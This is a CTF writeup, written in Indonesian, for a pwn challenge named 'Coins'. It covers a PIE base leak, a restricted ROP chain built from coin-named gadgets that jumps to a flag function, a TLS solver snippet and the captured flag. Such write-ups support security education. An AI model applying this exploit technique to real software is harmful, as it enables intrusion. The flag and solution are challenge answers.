# Coins — Pwn Writeup

## Overview

Challenge ini memberi sebuah binary `coins` yang kelihatannya seperti program pembayaran sederhana.

Saat dijalankan, program menampilkan dua informasi penting:

```text
starting balance:       0x...
flag price:             [your_balance] + 0x...
```

Remote berjalan lewat TLS, jadi koneksi biasa dengan socket polos akan timeout. Untuk testing manual bisa memakai:

```bash
ncat --ssl coins-83c5dda255ef.chall.nnsc.tf 1337
```

Flag yang didapat:

```text
NNS{wh0_co1N3d_7he_73rM_NUm15m471C5?}
```

---

## Analisis Binary

Dari reverse engineering, `starting balance` bukan balance uang biasa, tetapi leak alamat base runtime binary.

Nilainya berubah-ubah karena PIE aktif, tetapi bentuknya selalu seperti base address:

```text
starting balance = PIE base
```

Sedangkan `flag price` ditampilkan sebagai offset dari balance:

```text
flag price = PIE base + offset
```

Jadi program sebenarnya membocorkan alamat target yang perlu dicapai, yaitu fungsi untuk mencetak flag.

---

## Proteksi dan Permukaan Bug

Program membaca input user ke stack, lalu memproses input dalam bentuk qword 8-byte.

Setiap qword divalidasi. Qword yang valid harus menunjuk ke salah satu gadget/function kecil bertema coin, misalnya:

```text
loonie
scudo
dirham
dinar
karshapana
tetradrachm
sestertius
obol
lepton
tremissis
sovereign
drachma
nickel
dime
quarter
cent
shilling
```

Setelah validasi, program melakukan `ret` ke address pertama dari input tersebut.

Artinya input kita menjadi ROP chain, tetapi chain tersebut dibatasi hanya boleh memakai gadget coin yang disediakan program.

---

## Gadget Penting

Dua gadget paling penting untuk mencapai fungsi flag adalah:

```text
quarter
cent
shilling
```

Secara efek:

```text
quarter  -> rax = PIE_BASE + 0x1a26
cent     -> rax += r8
shilling -> jmp rax
```

Karena `shilling` melakukan jump ke `rax`, maka target akhirnya harus dibuat menjadi alamat fungsi flag.

Jika:

```text
flag_addr = PIE_BASE + flag_price_offset
```

maka kita perlu membuat:

```text
rax = flag_addr
```

Karena `quarter` mengisi:

```text
rax = PIE_BASE + 0x1a26
```

maka nilai yang harus dimasukkan ke `r8` adalah:

```text
r8 = flag_price_offset - 0x1a26
```

---

## Kendala Tambahan

Ada dua hal yang perlu diperhatikan.

Pertama, validator meninggalkan flag carry dalam kondisi tertentu, jadi chain diawali dengan gadget dummy untuk menetralkan efek tersebut. Dalam solver dipakai:

```text
loonie
```

Kedua, salah satu gadget menggunakan `r11`, dan pada awal chain `r11` berisi panjang payload. Jadi ketika memakai gadget seperti `sovereign`, nilainya harus dikompensasi terhadap `payload_len`.

Karena offset `flag price` berubah setiap koneksi, solver harus membaca banner dulu, mengambil offset, lalu menyusun chain secara dinamis.

---

## Strategi Eksploitasi

Alurnya:

1. Connect ke service memakai SSL/TLS.
2. Baca leak `starting balance`.
3. Baca offset `flag price`.
4. Hitung nilai `r8`:

```python
want_r8 = flag_price_offset - 0x1a26
```

5. Bentuk `r8` memakai kombinasi gadget coin.
6. Jalankan:

```text
quarter -> cent -> shilling
```

7. Program lompat ke alamat fungsi flag dan mencetak flag.

Contoh chain yang berhasil dari debug solver:

```text
loonie -> scudo -> dirham -> dinar -> karshapana -> tetradrachm -> sestertius -> obol -> lepton -> tremissis -> sovereign -> drachma -> nickel -> dime -> quarter -> cent -> shilling
```

---

## Solver

Solver membaca banner, menghitung target, lalu mengirim ROP chain berisi alamat gadget coin.

Bagian koneksi remote harus memakai SSL:

```python
raw = socket.create_connection((host, int(port)), timeout=8)
ctx = ssl._create_unverified_context()
s = ctx.wrap_socket(raw, server_hostname=host)
```

Command final:

```bash
python3 solve.py coins-83c5dda255ef.chall.nnsc.tf 1337
```

Output:

```text
starting balance:       0x7fdd3a667000
flag price:             [your_balance] + 0xb435b

got any cash?
> NNS{wh0_co1N3d_7he_73rM_NUm15m471C5?}
```

---


Final flag:

```text
NNS{wh0_co1N3d_7he_73rM_NUm15m471C5?}
```

